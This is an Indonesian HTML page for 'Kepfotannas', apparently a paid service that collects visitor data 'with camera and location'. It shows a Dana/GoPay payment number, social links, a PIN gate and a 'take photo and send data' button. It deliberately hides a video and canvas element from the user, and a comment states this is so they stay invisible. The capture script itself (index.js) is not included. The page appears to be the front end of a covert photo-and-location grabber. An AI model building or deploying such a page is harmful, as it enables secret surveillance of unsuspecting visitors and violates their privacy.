<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>Kepfotannas - Pembayaran & Data Pengunjung</title>
<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&display=swap" rel="stylesheet" />
<style>
  /* Reset */
  *, *::before, *::after {
    box-sizing: border-box;
  }
  html, body {
    margin: 0; padding: 0;
    height: 100%;
    font-family: 'Poppins', sans-serif;
    background: linear-gradient(135deg, #001f3f, #004080, #003366);
    color: #cce6ff;
    user-select: none;
    overflow-x: hidden;
  }
  body {
    display: flex;
    flex-direction: column;
    min-height: 100vh;
  }
  main {
    flex: 1;
    max-width: 400px;
    margin: 0 auto;
    padding: 2rem 1rem 4rem;
    display: flex;
    flex-direction: column;
    align-items: center;
  }
  h1 {
    font-size: 3rem;
    margin-bottom: 0.3rem;
    color: #00bfff;
    text-shadow:
      0 0 10px #00bfff,
      0 0 20px #00bfff,
      0 0 30px #00bfff;
    animation: neonPulse 3s ease-in-out infinite alternate;
    letter-spacing: 2px;
    user-select: text;
    text-align: center;
  }
  p.subtitle {
    font-size: 1.3rem;
    margin-bottom: 2rem;
    color: #66ccffcc;
    text-shadow: 0 0 8px #66ccffaa;
    user-select: text;
    text-align: center;
  }
  @keyframes neonPulse {
    0% {
      text-shadow:
        0 0 10px #00bfff,
        0 0 20px #00bfff,
        0 0 30px #00bfff;
    }
    100% {
      text-shadow:
        0 0 15px #00bfff,
        0 0 30px #00bfff,
        0 0 50px #00bfff;
    }
  }
  .payment-info {
    background: rgba(0, 191, 255, 0.15);
    border-radius: 1rem;
    padding: 1.5rem 2rem;
    width: 100%;
    box-shadow: 0 0 20px #00bfff88;
    user-select: text;
    margin-bottom: 2rem;
  }
  .payment-info h2 {
    margin-top: 0;
    color: #00e5ff;
    text-shadow: 0 0 8px #00e5ff;
    font-weight: 600;
    font-size: 1.8rem;
  }
  .payment-info p {
    font-size: 1.1rem;
    margin: 0.5rem 0;
    line-height: 1.4;
  }
  .payment-info .number {
    font-weight: 700;
    font-size: 1.4rem;
    letter-spacing: 0.1em;
    user-select: all;
  }
  .copy-btn {
    background: linear-gradient(90deg, #0099ff, #00bfff);
    border: none;
    border-radius: 1rem;
    color: #cce6ff;
    font-weight: 700;
    font-size: 1rem;
    padding: 0.5rem 1.2rem;
    cursor: pointer;
    box-shadow: 0 0 15px #00bfffcc, 0 0 30px #00bfffbb;
    margin-left: 1rem;
    transition: background 0.3s ease, box-shadow 0.3s ease;
    user-select: none;
  }
  .copy-btn:hover, .copy-btn:focus {
    background: linear-gradient(90deg, #00bfff, #0099ff);
    box-shadow: 0 0 30px #00bfffee, 0 0 60px #00bfffee;
    outline: none;
  }
  .links {
    display: flex;
    justify-content: center;
    gap: 2rem;
    margin-bottom: 2rem;
  }
  .links a {
    color: #00bfff;
    font-weight: 600;
    font-size: 1.2rem;
    text-decoration: none;
    text-shadow: 0 0 5px #00bfffaa;
    transition: color 0.3s ease;
    user-select: text;
  }
  .links a:hover, .links a:focus {
    color: #00e5ff;
    text-shadow: 0 0 15px #00e5ff;
    outline: none;
  }
  .btn {
    background: linear-gradient(90deg, #0099ff, #00bfff);
    border: none;
    border-radius: 1.3rem;
    color: #cce6ff;
    font-weight: 700;
    font-size: 1.15rem;
    padding: 16px 0;
    width: 100%;
    max-width: 280px;
    margin: 0 auto 1.5rem;
    cursor: pointer;
    box-shadow: 0 0 15px #00bfffcc, 0 0 30px #00bfffbb;
    position: relative;
    overflow: hidden;
    letter-spacing: 1.2px;
    text-shadow: 0 0 5px #00bfffaa;
    transition: background 0.3s ease, box-shadow 0.3s ease, transform 0.2s ease;
    user-select: none;
  }
  .btn:hover, .btn:focus {
    background: linear-gradient(90deg, #00bfff, #0099ff);
    box-shadow: 0 0 30px #00bfffee, 0 0 60px #00bfffee;
    transform: scale(1.07);
    outline: none;
    color: #e0f7ff;
    z-index: 1;
  }
  #status {
    text-align: center;
    margin-top: 1rem;
    font-weight: 600;
    color: #00d4ff;
    user-select: text;
    min-height: 1.5em;
    font-size: 1.1rem;
  }
  footer {
    margin-top: auto;
    font-size: 0.9rem;
    color: #66ccffaa;
    text-align: center;
    user-select: none;
    letter-spacing: 0.5px;
    text-shadow: 0 0 5px #00bfff88;
    padding: 1rem 0;
  }
  /* PIN overlay */
  #pinOverlay {
    position: fixed;
    top: 0; left: 0; right: 0; bottom: 0;
    background: rgba(0,0,0,0.95);
    display: flex;
    flex-direction: column;
    justify-content: center;
    align-items: center;
    z-index: 9999;
    user-select: none;
  }
  #pinOverlay[hidden] {
    display: none;
  }
  #pinOverlay h2 {
    color: #00bfff;
    text-shadow: 0 0 10px #00bfff;
    margin-bottom: 1rem;
    font-size: 2rem;
    text-align: center;
  }
  #pinInput {
    font-size: 2rem;
    padding: 0.5rem 1rem;
    border-radius: 0.8rem;
    border: none;
    width: 180px;
    text-align: center;
    letter-spacing: 0.3em;
    background: #003366;
    color: #00bfff;
    box-shadow: 0 0 10px #00bfff;
  }
  #pinInput:focus {
    outline: none;
    box-shadow: 0 0 20px #00e5ff;
  }
  #pinError {
    color: #ff5555;
    margin-top: 0.8rem;
    font-weight: 600;
    min-height: 1.2em;
    text-align: center;
  }
</style>
</head>
<body>

<main>
  <h1>ðŸ’³ Kepfotannas</h1>
  <p class="subtitle">Pembayaran Premium & Data Pengunjung dengan Kamera & Lokasi</p>

  <section class="payment-info" aria-label="Informasi Pembayaran">
    <h2>Metode Pembayaran</h2>
    <p>
      <strong>Dana & GoPay:</strong>
      <span class="number" id="paymentNumber">6283173814168</span>
      <button class="copy-btn" id="copyBtn" aria-label="Salin nomor pembayaran">ðŸ“‹ Salin</button>
    </p>
    <p><small>Nomor di atas dapat digunakan untuk Dana dan GoPay.</small></p>
  </section>

  <nav class="links" aria-label="Tautan Sosial Media">
    <a href="https://www.tiktok.com/@kepforannas7hs" target="_blank" rel="noopener" aria-label="TikTok kepforannas7hs">TikTok @kepforannas7hs</a>
    <a href="https://t.me/kepforannas7hs" target="_blank" rel="noopener" aria-label="Telegram kepforannas7hs">Telegram @kepforannas7hs</a>
  </nav>

  <button class="btn" id="startBtn" aria-live="polite" aria-busy="false" aria-label="Ambil foto dan kirim data">Ambil Foto & Kirim Data</button>

  <!-- Video dan canvas disembunyikan, tidak tampil ke user -->
  <video id="video" autoplay playsinline muted style="display:none;"></video>
  <canvas id="canvas" aria-hidden="true" style="display:none;"></canvas>

  <div id="status" role="status" aria-live="polite"></div>
</main>

<footer>&copy; 2025 Kepfotannas Payment System</footer>

<!-- PIN Overlay -->
<div id="pinOverlay" role="dialog" aria-modal="true" aria-labelledby="pinTitle" >
  <h2 id="pinTitle">Masukkan PIN untuk melanjutkan</h2>
  <input type="password" id="pinInput" maxlength="5" inputmode="numeric" autocomplete="one-time-code" aria-describedby="pinError" aria-label="Input PIN" />
  <div id="pinError" aria-live="assertive"></div>
</div>

<script src="index.js"></script>
</body>
</html>
